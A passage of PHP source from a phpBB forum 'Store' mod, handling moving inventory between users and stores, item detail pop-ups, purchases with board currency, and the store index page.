              inventory_store = 'NULL'
              WHERE inventory_id = " . intval($id[$i]);

            $store_sql = '';
          }
          else
          {
            $sql = "INSERT INTO " . STORE_INVENTORY . " ( inventory_item, inventory_user, inventory_price, inventory_amount)
              VALUES ( '" . $inventory_info['inventory_item'] . "', '" . $userdata['user_id'] . "', '" . $inventory_info['inventory_price'] . "', '" . intval($amount[$i]) . "' )";

            $new_store_amount = $inventory_info['inventory_amount'] - intval($amount[$i]);
            $store_sql = "UPDATE " . STORE_INVENTORY . " SET
              inventory_amount = '$new_store_amount'
              WHERE inventory_id = " . intval($id[$i]);
          }
        }
        if ( $store_sql )
        {
          if ( !$user_results = $db->sql_query($store_sql) )
          {
            message_die(GENERAL_ERROR, "error updating store items", "", __LINE__, __FILE__, $sql);
          }
        }
        if ( !$results = $db->sql_query($sql) )
        {
          message_die(GENERAL_ERROR, "error moving items", "", __LINE__, __FILE__, $sql);
        }
        $i++;
      }

      $message = $lang['Store_items_moved'] . "<br /><br />" . sprintf($lang['Click_return_store'], "<a href=\"" . append_sid("store.$phpEx?mode=store_items&id=" . $HTTP_POST_VARS['store_id']) . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

      message_die(GENERAL_MESSAGE, $message);
      
    }
    break;

  //--------------------
  //move inventory from a user to a store or a store to a user
  case 'moveinventory':
  
    //check to see if a store has been selected
    if ( $HTTP_POST_VARS['to_id'] == '-1' || !$id )
    {
      $message = $lang['Store_error_select_store_items'] . "<br /><br />" . sprintf($lang['Click_return_store_user_items'], "<a href=\"" . append_sid("store.$phpEx?mode=user_items") . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

      message_die(GENERAL_MESSAGE, $message);
    }
  
    //display confirm if it hasn't
    if ( !$confirm )
    {
      $page_title = $lang['Store_move_items'];
      include($phpbb_root_path . 'includes/page_header.'.$phpEx);

      $template->set_filenames(array(
        "body" => "store_move_inventory.tpl")
      );

      $template->assign_block_vars('switch_price', array());
      $template->assign_block_vars('switch_amount', array());
        
      $temp_url = append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=user_items');
      $store_nav = '-> <a href="' . $temp_url . '" class="nav">' . $lang['Store_user_items'] . '</a>';

      
      $template->assign_vars(array(
        'L_TITLE' => $lang['Store_move_items'],
        'L_ITEM' => $lang['Store_item'],
        'L_AMOUNT' => $lang['Store_amount'],
        'L_PRICE' => $lang['Store_price'],
        
        'U_STORE_NAV' => $store_nav,
        
        'S_SUBMIT_VALUE' => $lang['Submit'],
        'S_CANCEL_VALUE' => $lang['Cancel'],
        'S_SUBMIT_ACTION' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=moveinventory'),
        'S_HIDDEN_FIELDS' => '<input type="hidden" name="to_id" value="' . intval($HTTP_POST_VARS['to_id']) . '">')
      );
      $i = 0;
      while ( $i < count($id) )
      {
        $inven_id = intval($id[$i]);
				
				$inventory_info = inventory_info($inven_id);
        $item_info = item_info($inventory_info['inventory_item']);

        $template->assign_block_vars('item_row', array(
          'I' => $i,
          'ID' => $inven_id,
          'ITEM' => $item_info['item_name'],
          'AMOUNT' => $inventory_info['inventory_amount'])
        );
        $i++;
        
        $template->assign_block_vars('item_row.switch_price', array());
        $template->assign_block_vars('item_row.switch_amount', array());
      }
    }
    else
    {
      //move items to store
      $amount = $HTTP_POST_VARS['amount'];
      $price = $HTTP_POST_VARS['price'];
      $to_id = intval($HTTP_POST_VARS['to_id']);
      $i = 0;
      while ( $i < count($id) )
      {
        $inven_id = intval($id[$i]);
				$n_price = floatval($price[$i]);
				$n_amount = intval($amount[$i]);
				
				$inventory_info = inventory_info($inven_id);
        $item_info = item_info($inventory_info['inventory_item']);
        
        //see if store already has item
        $store_item = "SELECT inventory_id, inventory_amount FROM " . STORE_INVENTORY . " WHERE inventory_item = " . $inventory_info['inventory_item'] . " AND inventory_store = $to_id LIMIT 1";

        if ( !$store_results = $db->sql_query($store_item) )
        {
          message_die(GENERAL_ERROR, "error getting stores items", "", __LINE__, __FILE__, $sql);
        }
        $store_item = $db->sql_fetchrow($store_results);
        if ( !$board_config['store_sell_special'] && $item_info['item_special'] )
        {
          $go = false;
        }
        else
        {
          $go = true;
        }
        
        if ( $go )
        {
          if ( isset($store_item['inventory_id']) )
          {
            $new_amount = $store_item['inventory_amount'] + $n_amount;
            $new_user_amount = $inventory_info['inventory_amount'] - $n_amount;
            $sql = "UPDATE " . STORE_INVENTORY . " SET
              inventory_amount = '$new_amount',
              inventory_price = '" . $n_price . "'
              WHERE inventory_id = " . $store_item['inventory_id'];
            
            if ( $new_user_amount != '0' )
            {
              $user_sql = "UPDATE " . STORE_INVENTORY . " SET
                inventory_amount = '$new_user_amount'
                WHERE inventory_id = " . $inven_id;
            }
            else
            {
              $user_sql = "DELETE FROM " . STORE_INVENTORY . " WHERE inventory_id = " . $inven_id;
            }
          }
          else
          {
            if ( $n_amount == $inventory_info['inventory_amount'] )
            {
              $sql = "UPDATE " . STORE_INVENTORY . " SET
                inventory_user = 'NULL',
                inventory_store = '$to_id',
                inventory_price = '" . $n_price . "'
                WHERE inventory_id = " . $inven_id;
              
              $user_sql = '';
            }
            else
            {
              $sql = "INSERT INTO " . STORE_INVENTORY . " ( inventory_item, inventory_store, inventory_price, inventory_amount)
              VALUES ( '" . $inventory_info['inventory_item'] . "', '$to_id', '" . $n_price . "', '" . $n_amount . "' )";
              
              $new_user_amount = $inventory_info['inventory_amount'] - $n_amount;
              $user_sql = "UPDATE " . STORE_INVENTORY . " SET
                inventory_amount = '$new_user_amount'
                WHERE inventory_id = " . $inven_id;
            }
          }
          if ( $user_sql )
          {
            if ( !$user_results = $db->sql_query($user_sql) )
            {
              message_die(GENERAL_ERROR, "error updating user items", "", __LINE__, __FILE__, $sql);
            }
          }

          if ( !$results = $db->sql_query($sql) )
          {
            message_die(GENERAL_ERROR, "error moving items", "", __LINE__, __FILE__, $sql);
          }
        }
        $i++;
      }
      
      $message = $lang['Store_items_moved'] . "<br /><br />" . sprintf($lang['Click_return_store_user_items'], "<a href=\"" . append_sid("store.$phpEx?mode=user_items") . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

      message_die(GENERAL_MESSAGE, $message);
    }
    break;

  //--------------------
  //display a list of the store's items
  case 'store_items':
  
		$id = intval($id);
    $store_info = store_info($id);
    if ( $userdata['session_logged_in'] && $userdata['user_id'] == $store_info['owner_id'] )
    {
      $template->assign_block_vars('switch_owner', array());

      //delete link
      $temp_url = append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=delete_store&id=' . $store_info['store_id']);
      $delete = '&nbsp;<a href="' . $temp_url . '" class="genmed">' . $lang['Delete'] . '</a>&nbsp;';

      //edit link
      $temp_url = append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=edit_store&id=' . $store_info['store_id']);
      $edit = '&nbsp;<a href="' . $temp_url . '" class="genmed">' . $lang['Edit'] . '</a>&nbsp;';
    }
    else
    {
      $delete = '';
      $edit = '';
    }

    $temp_url = append_sid($phpbb_root_path . 'store.'.$phpEx);
    $store_nav = '-> <a href="' . $temp_url . '" class="nav">' . $lang['Stores_link'] . '</a>';

    $page_title = $store_info['store_name'] . ' ' . $lang['Store'];
    include($phpbb_root_path . 'includes/page_header.'.$phpEx);
    
    $template->set_filenames(array(
        "body" => "store_inventory_body.tpl")
    );

    $template->assign_vars(array(
      'L_ITEM' => $lang['Store_item'],
      'L_AMOUNT' => $lang['Store_amount'],
      'L_PRICE' => $lang['Store_price'],
      'L_CASH' => $lang['Store_cash'],
      'L_YOUR_CASH' => $lang['Store_your_cash'],
      'L_DESCRIPTION' => $lang['Store_description'],
      
      'U_STORE_NAV' => $store_nav,
      'U_ITEM_WINDOW' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=itemdescript&id='),

      'S_BUY_ACTION' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=buy'),
      'S_BUY_VALUE' => $lang['Store_buy'],
      
      'S_MOVE' => $lang['Store_move_items'],
      'S_EDIT_PRICE' => $lang['Store_price'],
	  'S_ADD_SERVICE' => 'Add Services',
      'S_GO' => $lang['Go'],
      'S_HIDDEN_FIELDS' => '<input type="hidden" name="store_id" value="' . $store_info['store_id'] . '">',
		
      'STORE_NAME' => stripslashes(trim($store_info['store_name'])),
      'STORE_DESCRIPTION' => stripslashes(trim($store_info['store_description'])),
      'STORE_OWNER' => get_owner($store_info['owner_id']),
      'STORE_CASH' => $store_info['cash_name'],
      'USER_CASH' => $userdata[$store_info['cash_field']],
      'STORE_EDIT' => $edit,
      'STORE_DELETE' => $delete)
    );
    
    item_list('store', $id);

    break;
    
  //--------------------
  //display item details in popup window
  case 'itemdescript':

		$id = intval($id);

    $row = inventory_info($id);
    $item_row = item_info($row['inventory_item']);
    
    $item_name = stripslashes(trim($item_row['item_name']));
    $item_description = stripslashes(trim($item_row['item_description']));
    $price = $row['inventory_price'];
    $amount = $row['inventory_amount'];
    $image = $item_row['item_image'];
    $colspan = "2";
    
    if ( $image != '' )
    {
      $template->assign_block_vars('switch_image', array());
      $colspan = "2";
    }
    
	if($item_row['item_type'] == 0) {
		$special = "Normal Item";
	} else if ( $item_row['item_type'] == 1 )
    {
      $special = '<img src="http://blackstar.inkwell.com.ru/images/special'.(($userdata['user_style']==2)?'_trans':'').'.gif" />';
    } else if ($item_row['item_type'] == 2) {
      $special = "Board Service";
    } else if($item_row['item_type'] == 3) {
		$special = "User Service";
	}
    
    $gen_simple_header = true;
    $page_title = $lang['Store_MOD'] . ' :: ' . $item_name;
    include($phpbb_root_path . 'includes/page_header.'.$phpEx);
    $template->set_filenames(array(
      "body" => "store_item_details_body.tpl")
    );

    $template->assign_vars(array(
      'ID' => $id,
      'ITEM_NAME' => $item_name,
      'ITEM_DESCRIPTION' => $item_description,
      'PRICE' => $price,
      'AMOUNT' => $amount,
      'IMAGE' => $image,
      'SPECIAL' => $special,
      'COLSPAN' => $colspan,
      
      'L_PRICE' => $lang['Store_price'],
      'L_AMOUNT' => $lang['Store_amount'],
      'L_SPECIAL' => $lang['Store_special'],
      'L_CLOSE_WINDOW' => $lang['Close_window'],
      
      'S_BUY_VALUE' => $lang['Store_buy'],
      'S_BUY_ACTION' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=buy'))
    );
  
    break;
    
  //--------------------
  //buy an item from a store
  case 'buy':
  
		$id = intval($id);

    $amount = intval($HTTP_POST_VARS['amount']);
    $inventory_info = inventory_info($id);
    $store_info = store_info($inventory_info['inventory_store']);
    
    //see if logged in
    if ( !$userdata['session_logged_in'] )
    {
      redirect($phpbb_root_path . 'login.'.$phpEx.'?redirect=store.'.$phpEx.'&mode=store_items&id='.$inventory_info['inventory_store'], true);
    }
    
    $total_price = $inventory_info['inventory_price'] * $amount;
    
    //run check to see if they have enough money and are getting an 'ok' amount of the item
    if ( $amount <= 0 || $amount > $board_config['store_max_buy'] || $amount > $inventory_info['inventory_amount'] || $total_price > $userdata[$store_info['cash_field']] )
    {
      $message = $lang['Store_error_cant_buy'] . "<br /><br />" . sprintf($lang['Click_return_store'], "<a href=\"" . append_sid("store.$phpEx?mode=store_items&id=" . $inventory_info['inventory_store']) . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

      message_die(GENERAL_MESSAGE, $message);
    }
    
    //update buyers cash
    $new_user_cash = $userdata[$store_info['cash_field']] - $total_price;
    store_update_cash($userdata['user_id'], $new_user_cash, $store_info['cash_field']);
    
    //see if user already has item in inventory and add to that amount
    $buyer_item = "SELECT inventory_id, inventory_amount FROM " . STORE_INVENTORY . " WHERE inventory_item = " . $inventory_info['inventory_item'] . " AND inventory_user = " . $userdata['user_id'];
    if ( !$buyer_results = $db->sql_query($buyer_item) )
    {
      message_die(GENERAL_ERROR, "error getting users items", "", __LINE__, __FILE__, $sql);
    }
    $buyer_item = $db->sql_fetchrow($buyer_results);
    //user has the item so update it
    if ( $buyer_item['inventory_id'] )
    {
      //update users amount of the item
      $amount2 = $amount + $buyer_item['inventory_amount'];
      $inventory_sql = "UPDATE " . STORE_INVENTORY . " SET
        inventory_amount = '$amount2',
        inventory_price = '" . $inventory_info['inventory_price'] . "'
        WHERE inventory_id = " . $buyer_item['inventory_id'];
        
      //updates store's amount of the item
      $new_inventory_amount = $inventory_info['inventory_amount'] - $amount;
      $update_sql = "UPDATE " . STORE_INVENTORY . " SET
        inventory_amount = '$new_inventory_amount'
        WHERE inventory_id = $id";
    }
    //user doesn't have the item
    else
    {
      $inventory_sql = "INSERT INTO " . STORE_INVENTORY . " ( inventory_item, inventory_user, inventory_price, inventory_amount ) VALUES ( '" . $inventory_info['inventory_item'] . "', '" . $userdata['user_id'] . "', '" . $inventory_info['inventory_price'] . "', '" . $amount . "' )";

      //update store's amount
      $new_inventory_amount = $inventory_info['inventory_amount'] - $amount;
      $update_sql = "UPDATE " . STORE_INVENTORY . " SET
        inventory_amount = '$new_inventory_amount'
        WHERE inventory_id = $id";
    }
    if ( !$inventory_results = $db->sql_query($inventory_sql) )
    {
      message_die(GENERAL_ERROR, "error updating inventory", "", __LINE__, __FILE__, $sql);
    }
    if ( $update_sql != '')
    {
      if ( !$update_results = $db->sql_query($update_sql) )
      {
        message_die(GENERAL_ERROR, "error updating stores inventory", "", __LINE__, __FILE__, $sql);
      }
    }
    
    if ( $store_info['owner_id'] != BOARD_OWNED )
    {
      //update owners cash
      $owner_info = get_userdata($store_info['owner_id']);
      $new_owner_cash = $owner_info[$store_info['cash_field']] + $total_price;
      store_update_cash($store_info['owner_id'], $new_owner_cash, $store_info['cash_field']);
    }
  
    $message = $lang['Store_item_purchased'] . "<br /><br />" . sprintf($lang['Click_return_store'], "<a href=\"" . append_sid("store.$phpEx?mode=store_items&id=" . $inventory_info['inventory_store']) . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

    message_die(GENERAL_MESSAGE, $message);
  
    break;

  //--------------------
  //display a list of stores.  User's own stores, board stores, and user owned stores.
  default:
  
    $page_title = $lang['Store_MOD'];
    include($phpbb_root_path . 'includes/page_header.'.$phpEx);
    $template->set_filenames(array(
      "body" => "store_index_body.tpl")
    );

    $template->assign_vars(array(
      'L_USER_STORES' => $lang['Store_user_owned'],
      'L_BOARD_STORES' => $lang['Store_board_owned'],
      'L_OWNED_STORES' => $lang['Store_you_owned'],

      'L_ACTION' => $lang['Store_action'],
      'L_STORE' => $lang['Store'],
      'L_OWNER' => $lang['Store_owner'],
      'L_ITEMS' => $lang['Store_items'],
      'L_CASH' => $lang['Store_cash'],

      'S_NEW_ACTION' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=create_store'),
      'S_NEW_VALUE' => $lang['Store_create'])
    );
  
    if ( $userdata['session_logged_in'] && $board_config['store_user_stores'] != 0 )
    {
      $template->assign_block_vars('switch_owned_stores', array());
      //stores the user owns
      get_stores('owned', 'switch_owned_stores.owned_row', $userdata['user_id']);
      if ( $userdata['stores_owned'] < $board_config['store_user_stores'] )
      {
          $template->assign_block_vars('switch_owned_stores.switch_new_store', array());
      }
    }
    
    //stores the board owns
    get_stores('board', 'board_row');
    
    //run check to see if there are user stores
    $sql = "SELECT * FROM " . STORE_LIST . " WHERE owner_id <> " . BOARD_OWNED . " LIMIT 1";
    if ( !$results = $db->sql_query($sql) )
    {
      message_die(GENERAL_ERROR, "error getting user owned stores", "", __LINE__, __FILE__, $sql);
    }
    $row = $db->sql_fetchrow($results);
    if ( isset($row['owner_id']) )
    {
      $template->assign_block_vars('switch_stores', array());
      //stores other users own
      get_stores('user', 'switch_stores.user_row');
    }

    break;
    
}

$template->pparse('body');

include($phpbb_root_path . 'includes/page_tail.'.$phpEx);

?>
